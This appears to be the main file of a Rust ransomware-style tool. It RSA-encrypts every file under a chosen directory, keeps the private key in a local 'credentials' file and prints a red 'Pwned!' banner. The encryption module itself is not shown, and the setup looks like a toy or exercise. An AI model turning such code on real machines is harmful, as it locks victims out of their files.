mod cyp;
use crate::cyp::cyp::*;
use std::path::Path;
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = clap::Command::new("Program")
        .version("1.0")
        .about("Encodes or decodes data")
        .arg(
            clap::Arg::new("decode")
                .short('d')
                .long("decode")
                .help("Run in decode mode")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            clap::Arg::new("encode")
                .short('e')
                .long("encode")
                .help("Run in encode mode")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            clap::Arg::new("root")
                .short('r')
                .long("root")
                .help("Specify the root directory")
                .default_value("trash"),
        )
        .get_matches();

    let enc = matches.get_flag("encode");
    let dec = matches.get_flag("decode");
    let root = matches.get_one::<String>("root").unwrap();

    // Validate encoding/decoding mutual exclusivity
    if enc && dec {
        eprintln!("Error: Cannot specify both --decode and --encode at the same time.");
        std::process::exit(1);
    }

    // Ensure a valid root path exists
    if !Path::new(&root).exists() {
        eprintln!("Error: Specified root path '{}' does not exist.", root);
        std::process::exit(1);
    }

    // Execute encoding or decoding
    if enc {
        let mut cyph = rsa_head();
        let _ = cyp_dirs(Path::new(&root), rsa_enc, &mut cyph)?;
        save_priv_key(cyph, "credentials")?;
        println!("{}", "\x1b[31m
    ____                                ____
   / __ \\____ __      ______  ___  ____/ / /
  / /_/ / __ `/ | /| / / __ \\/ _ \\/ __  / /
 / ____/ /_/ /| |/ |/ / / / /  __/ /_/ /_/
/_/    \\__,_/ |__/|__/_/ /_/\\___/\\__,_(_) \x1b[0m");
    } else if dec {
        let mut cyph = get_cypher("credentials")?;
        let _ = cyp_dirs(Path::new(&root), rsa_dec, &mut cyph)?;
    } else {
        eprintln!("Error: Please specify either --encode or --decode.");
        std::process::exit(1);
    }

    Ok(())
}
